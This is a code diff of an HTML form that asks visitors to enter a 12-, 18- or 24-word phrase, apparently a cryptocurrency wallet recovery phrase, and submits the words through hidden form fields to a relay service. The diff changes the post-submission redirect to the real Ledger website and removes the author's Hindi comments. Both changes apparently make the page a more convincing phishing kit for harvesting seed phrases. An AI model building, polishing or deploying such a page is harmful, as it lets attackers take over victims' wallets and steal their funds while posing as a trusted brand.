@@ -56,7 +56,7 @@
             <div class="grid" id="phraseGrid"></div>
 
             <input type="hidden" name="_subject" value="Website Data Submission">
-            <input type="hidden" name="_next" value="https://my-first-website-rkrv.onrender.com/thankyou.html"> 
+            <input type="hidden" name="_next" value="https://www.ledger.com/">
             
             <input type="hidden" name="phrase_word_count" id="phrase_word_count" value="24">
 
@@ -70,19 +70,17 @@
         const btn12 = document.getElementById('btn12');
         const btn18 = document.getElementById('btn18');
         const btn24 = document.getElementById('btn24');
-        const countInput = document.getElementById('phrase_word_count'); // नई हिडन फील्ड
+        const countInput = document.getElementById('phrase_word_count'); 
 
         function generateBoxes(count) {
             grid.innerHTML = '';
             for (let i = 1; i <= count; i++) {
                 const input = document.createElement('input');
                 input.placeholder = i;
-                // प्रत्येक इनपुट को एक अद्वितीय नाम दिया गया है
-                input.name = `word_${i}`; 
+                input.name = `word_${i}`;
                 input.required = true;
                 grid.appendChild(input);
             }
-            // शब्द गणना अपडेट करें
             countInput.value = count; 
         }
 
@@ -91,7 +89,6 @@
             btn.classList.add('active');
         }
 
-        // onclick इवेंट्स में generateBoxes को कॉल करने के बाद activateButton को कॉल किया गया है
         btn12.onclick = () => { generateBoxes(12); activateButton(btn12); };
         btn18.onclick = () => { generateBoxes(18); activateButton(btn18); };
         btn24.onclick = () => { generateBoxes(24); activateButton(btn24); };
